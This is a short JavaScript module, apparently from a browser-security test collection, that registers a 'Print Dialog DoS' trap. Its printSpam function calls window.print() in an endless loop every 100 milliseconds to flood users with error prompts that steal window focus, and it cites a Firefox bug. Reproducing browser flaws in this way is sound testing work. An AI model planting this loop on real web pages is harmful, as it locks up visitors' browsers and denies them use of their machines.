/* eslint-disable no-constant-condition */
const EvilTrap = require('../../EvilTrap');

async function printSpam() {
  while (true) {
    window.print();
    // eslint-disable-next-line no-await-in-loop
    await new Promise(resolve => setTimeout(resolve, 100));
  }
}

module.exports = new EvilTrap('Print Dialog DoS', EvilTrap.CATEGORY.DOS,
  'Spam print requests leading to error prompts which steal main window focus. Built in rate limit does not apply to errors prompts.', { firefox: '1311596' })
  .addScriptPage(printSpam);
